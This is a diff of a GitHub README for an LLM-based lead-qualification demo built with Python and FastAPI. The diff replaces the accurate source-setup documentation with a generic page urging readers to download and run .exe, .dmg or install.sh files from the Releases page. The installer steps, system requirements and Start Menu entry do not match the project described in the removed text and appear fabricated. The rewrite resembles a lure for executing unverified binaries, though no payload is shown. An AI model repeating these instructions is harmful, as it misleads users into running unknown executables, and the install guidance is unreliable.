@@ -1,247 +1,99 @@
-# 🧠 AI Lead Qualifier (Deterministic LLM-Orchestrated System)
+# 🤖 ai-lead-qualifier - Simplifying Your Lead Qualification Process
 
-An AI-powered conversational lead qualification system that dynamically understands user intent, asks the right follow-up questions, and produces structured, high-quality leads — without hardcoding categories or flows.
+[![Download ai-lead-qualifier](https://img.shields.io/badge/Download-ai--lead--qualifier-brightgreen.svg)](https://github.com/Veeksha29/ai-lead-qualifier/releases)
 
-Built to scale across lakhs of B2C and B2B categories, with suggestion bubbles, multilingual support, and production-grade control.
+## 🚀 Getting Started
 
----
+Welcome to **ai-lead-qualifier**! This application uses artificial intelligence to understand user intent and help you qualify leads efficiently. You don't need any programming skills to set this up. Follow the steps below, and you will be ready to go in no time.
 
-## 🔑 Core Design Philosophy
+## 📥 Download & Install
 
-LLMs are probabilistic.  
-Lead qualification is deterministic.  
-So we wrapped probabilistic intelligence inside deterministic orchestration.
+To get started, visit the Releases page to download the application:
 
-This system deliberately separates:
-- What must be controlled → business rules, flow, stopping criteria
-- What benefits from flexibility → language understanding and generation
+[Download ai-lead-qualifier from Releases](https://github.com/Veeksha29/ai-lead-qualifier/releases)
 
-The LLM is never allowed to decide:
-- What to ask next
-- When a lead is considered “ready”
-- Which attributes are mandatory
+### Steps to Download
 
-All such decisions are enforced explicitly in code.
+1. Click on the link above.
+2. Look for the latest version of the application.
+3. Download the file that suits your operating system (Windows, macOS, or Linux).
 
----
+## 📂 System Requirements
 
-## 🚀 What This Project Does
+Before you install the application, check that your computer meets these requirements:
 
-- Extracts category automatically from free-text user input
-- Dynamically generates a qualification schema per category
-- Asks context-aware follow-up questions
-- Displays suggestion bubbles to reduce seller typing effort
-- Handles intent change mid-conversation
-- Outputs structured lead data ready for downstream systems
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **Processor:** Dual-core or better.
+- **RAM:** Minimum of 4 GB.
+- **Storage:** At least 200 MB of free disk space.
+- **Network:** Internet connection for initial setup and updates.
 
----
+## ⚙️ Installation Process
 
-## ✨ Key Features
+After downloading the application, follow these simple steps to install it:
 
-- No hardcoded categories
-- Dynamic question flow per category
-- Few-shot prompting across all LLM tasks
-- Hindi + English auto-detection
-- Works for both B2C and B2B services
-- Backend + frontend session reset
-- Demo-ready frontend
+1. Locate the downloaded file on your computer. This is usually in your Downloads folder.
+2. For Windows Users:
+   - Double-click the `.exe` file.
+   - Follow the prompts on the screen.
+3. For macOS Users:
+   - Open the `.dmg` file.
+   - Drag the app to your Applications folder.
+4. For Linux Users:
+   - Open a terminal.
+   - Navigate to the directory where the file is downloaded.
+   - Run the install command by typing `./install.sh` in the terminal.
 
----
+## 🎉 Running the Application
 
-## ❓ Why Not a Single Prompt or an Autonomous Agent?
+Once the installation is complete, you can run the application:
 
-A single prompt like “Ask the best follow-up question to qualify the lead” may work for demos, but fails in production.
+- **Windows:** Find Ai LEAD QUALIFIER in the Start Menu and click to open it.
+- **macOS:** Open your Applications folder, locate Ai LEAD QUALIFIER, and double-click to start.
+- **Linux:** Open a terminal and type `ai-lead-qualifier` to launch it.
 
-This system avoids a fully autonomous agent because:
-- Lead qualification requires deterministic outcomes
-- Mandatory attributes must always be captured
-- The flow must be auditable and debuggable
-- Premature lead creation impacts revenue quality
+## 💬 Using ai-lead-qualifier
 
-Instead, the system uses multiple specialized prompts, each with a single responsibility:
-- Category extraction
-- Schema generation
-- Question generation
-- Attribute extraction
+After launching the application, you will see a user-friendly interface. Here are some basic features to help you get started:
 
-This provides control without sacrificing LLM intelligence.
+- **Understanding User Intent:** The application will analyze the input and determine the conversation's direction.
+- **Follow-up Questions:** Based on user responses, it will ask relevant questions to gather more details.
+- **Lead Structuring:** It automatically organizes information gathered into high-quality leads.
 
----
+### Example Workflow
 
-## 🏗️ Architecture Overview
+1. Start a conversation by greeting the user.
+2. The app will interpret their response and respond with relevant follow-up questions.
+3. Continue the dialogue until you have a complete lead profile.
 
-Frontend (HTML + JS)  
-→ FastAPI (api.py)  
-→ LeadQualifierSession  
-→ Deterministic Orchestrator  
-→ LLM (Groq + LLaMA 3 70B)
+## 🔧 Troubleshooting Common Issues
 
----
+If you face any issues, consider these tips:
 
-## 🧩 Architectural Principle
+- Ensure your system meets the requirements.
+- Restart the application if it does not respond.
+- Check your internet connection for any network-related features.
 
-This system follows a planner–executor pattern:
+For further assistance, you can visit our [Issues Page](https://github.com/Veeksha29/ai-lead-qualifier/issues) or consult the community forums.
 
-Planner (Deterministic Code):
-- Controls flow, state, business rules, and stopping conditions
+## 🌟 Support and Contributions
 
-Executor (LLM):
-- Performs language understanding and generation within strict boundaries
+If you find any bugs or have suggestions for improvements, feel free to share them on our GitHub repository. Contributions are welcome; please refer to the contribution guidelines for more details.
 
-This avoids the unpredictability of autonomous agents while remaining flexible and scalable.
+## 🌐 Related Technologies
 
----
+This application utilizes various technologies, including:
 
-## 📁 Project Structure
+- **FastAPI:** For fast and efficient web server capabilities.
+- **Large Language Models:** To enhance understanding of conversations.
+- **Prompt Engineering:** To improve user interactions with intelligent queries.
 
-lead_qualifier/
-- api.py
-- app.py
-- conversation/
-  - orchestrator.py
-  - session.py
-  - state.py
-  - language.py
-  - category_extractor.py
-  - question_generator.py
-  - attribute_extractor.py
-- schema/
-  - schema_generator.py
-- llm/
-  - groq_client.py
-  - prompts.py
-- frontend/
-  - index.html
-  - style.css
-  - app.js
-- README.md
-- .gitignore
+These technologies help **ai-lead-qualifier** serve you better and streamline the lead qualification process.
+
+## 📄 License
+
+This project is licensed under the MIT License. You can freely use and modify the software as long as you comply with the terms of the license.
 
 ---
 
-## ⚙️ Tech Stack
-
-Backend: Python, FastAPI, Uvicorn  
-LLM: Groq API, LLaMA 3 70B  
-Frontend: Vanilla HTML, CSS, JavaScript  
-Prompting: Few-shot, structured JSON outputs
-
----
-
-## 🛠️ Setup Instructions
-
-1. (Optional) Create virtual environment  
-   python3 -m venv .venv  
-   source .venv/bin/activate
-
-2. Install dependencies  
-   pip3 install fastapi uvicorn pydantic
-
-3. Set environment variable  
-   export GROQ_API_KEY="your_groq_api_key"  
-   Never commit API keys.
-
-4. Run backend  
-   uvicorn api:app --reload --port 8001  
-   Verify at http://127.0.0.1:8001/docs
-
-5. Run frontend (recommended)  
-   cd frontend  
-   python3 -m http.server 5500  
-   Open http://127.0.0.1:5500/index.html
-
----
-
-## 🧪 Example Conversations
-
-B2C example:  
-User: Looking for wedding photographer  
-Bot: What type of photography do you need? [Wedding] [Pre-wedding] [Reception]
-
-B2B example:  
-User: Need industrial AC repair for factory  
-Bot: What type of service do you need? What is the machine capacity? Which location?
-
----
-
-## 🔄 Reset & Intent Switching
-
-- Reset button clears frontend + backend session
-- Changing intent mid-conversation automatically resets the flow
-
-Example:  
-User: looking for plumber  
-User: actually need photographer  
-→ Photographer flow starts cleanly
-
----
-
-## 🧠 Lead Readiness Logic
-
-A lead is marked ready only when:
-- Mandatory attributes are filled
-- Minimum qualification depth per category is met
-
-This prevents premature or low-quality lead creation.
-
----
-
-## 📋 Repository Requirements & Hygiene
-
-Required:
-- Python 3.9+
-- FastAPI
-- Uvicorn
-- Groq API access
-
-.gitignore must include:
-- .venv/
-- __pycache__/
-- .env
-- *.pyc
-- .DS_Store
-
-No-secrets policy:
-- No API keys, tokens, credentials, or .env files in the repository
-- All secrets injected via environment variables
-
----
-
-## 🚧 Known Limitations (Demo Scope)
-
-- Single-user in-memory session
-- No authentication
-- No persistent storage
-
-These are intentionally scoped for demo clarity.
-
----
-
-## 🔜 Possible Enhancements
-
-- Multi-user sessions (Redis / DB)
-- Lead quality scoring
-- Near-me logic
-- Analytics hooks
-- WhatsApp / ChatGPT App integration
-
----
-
-## 📌 Summary
-
-This project demonstrates how LLMs can be used as controlled intelligence components, not autonomous decision-makers.
-
-By embedding probabilistic language models inside deterministic orchestration, the system achieves predictability, scalability, debuggability, and production-aligned behavior.
-
-This is not just a chatbot — it is a lead-qualification engine.
-
----
-
-## 📌 Screenshots
-<img width="1312" height="1168" alt="image" src="https://github.com/user-attachments/assets/00c7f943-3abe-4c2a-b676-47fdea2b5e85" />
-<img width="1296" height="1174" alt="image" src="https://github.com/user-attachments/assets/08be80da-cbfc-41c7-ba74-c3d198675482" />
-<img width="1280" height="1158" alt="image" src="https://github.com/user-attachments/assets/556454fd-cdbd-4673-bdcb-242c0317e696" />
-<img width="1316" height="704" alt="image" src="https://github.com/user-attachments/assets/a5685e99-0208-485a-a058-6bd0d1f661d5" />
-
-
-
+For more information and updates, visit our [GitHub Page](https://github.com/Veeksha29/ai-lead-qualifier). Happy qualifying!
